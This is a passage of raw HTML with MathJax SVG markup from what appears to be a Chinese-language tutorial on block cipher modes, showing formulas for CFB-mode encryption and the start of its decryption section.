637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(2795.9, 0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="msub" transform="translate(3440.9, 0)"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="TeXAtom" transform="translate(759, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(429, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(1207, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g></g><g data-mml-node="mo" transform="translate(5435, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(5713, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(5991, 0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(715, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(412, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1190, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(7951, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(8395.7, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(9173.4, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(10229.2, 0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(10919, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(11974.8, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container><br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.016ex" xmlns="http://www.w3.org/2000/svg" width="37.918ex" height="3.163ex" role="img" focusable="false" viewBox="0 -949 16759.9 1398"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mi" transform="translate(715, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(1334.1, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2389.9, 0)"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(970, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(3867.9, 0)"><path data-c="2A01" d="M668 944Q697 949 744 949Q803 949 814 948Q916 937 1006 902T1154 826T1262 730T1336 638T1380 563Q1454 415 1454 250Q1454 113 1402 -14T1258 -238T1036 -391T755 -449Q608 -449 477 -392T255 -240T110 -16T56 250Q56 387 105 510T239 723T434 871T668 944ZM706 299V850H704Q519 832 386 725T198 476Q181 433 169 379T156 300Q156 299 431 299H706ZM1116 732Q1054 778 982 807T871 842T810 849L804 850V299H1079Q1354 299 1354 300Q1354 311 1352 329T1336 402T1299 506T1228 620T1116 732ZM706 -350V201H431Q156 201 156 200Q156 189 158 171T174 98T211 -6T282 -120T395 -232Q428 -257 464 -277T527 -308T587 -328T636 -339T678 -346T706 -350ZM1354 200Q1354 201 1079 201H804V-350Q808 -349 838 -345T887 -338T940 -323T1010 -295Q1038 -282 1067 -265T1144 -208T1229 -121T1301 0T1349 158Q1354 188 1354 200Z"></path></g><g data-mml-node="mi" transform="translate(5545.5, 0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(6596.5, 0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="msub" transform="translate(7241.5, 0)"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mi" transform="translate(759, -150) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="mo" transform="translate(8382.2, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(8771.2, 0)"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mi" transform="translate(738, -150) scale(0.707)"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g></g><g data-mml-node="mo" transform="translate(10187.8, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(10576.8, 0)"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(440, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(11358.1, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(11747.1, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(12136.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(12580.8, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(13358.6, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(14414.3, 0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(15104.1, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(16159.9, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></p>
<hr>
<p><img src="https://gitee.com/auxein/images/raw/master/BlockCipher/CFB2.png"></p>
<p>解密：<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="7.806ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 3450.1 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mn" transform="translate(440, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1121.3, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2177.1, 0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(2681.1, 0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 